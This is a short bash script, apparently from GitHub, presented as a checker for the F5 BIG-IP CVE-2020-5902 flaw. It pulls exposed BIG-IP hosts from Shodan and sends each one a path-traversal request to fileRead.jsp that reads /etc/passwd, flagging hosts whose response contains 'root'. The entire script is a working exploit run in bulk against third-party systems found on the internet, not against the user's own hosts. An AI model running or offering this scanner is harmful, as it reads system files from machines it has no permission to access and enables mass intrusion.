#!/bin/bash
# https://github.com/faisalfs10x
# 08-JULY-2020 
# F5 BIG-IP CVE-2020-5902 checker

echo -e "\n\e[92mF5 BIG-IP CVE-2020-5902 checker\e[0m\n"
tar_IP=$(shodan search --fields 'ip_str,port' --separator , 'http.title:"BIG-IP&reg;- Redirect"  ' 2>/dev/null | sort -u |  awk -F',' '{print $1":"$2}')
echo -e "\n\e[92m[+]Trying to verify the vulnerable targets: \e[0m"
for ip in $tar_IP;
do
    if curl -s "https://$ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" -k --connect-timeout 5 | grep -q "root"; then
		echo -e "\e[91m$ip vulnerable\e[0m"
	else
		echo -e "\e[92m$ip is good\e[0m"
	fi
done
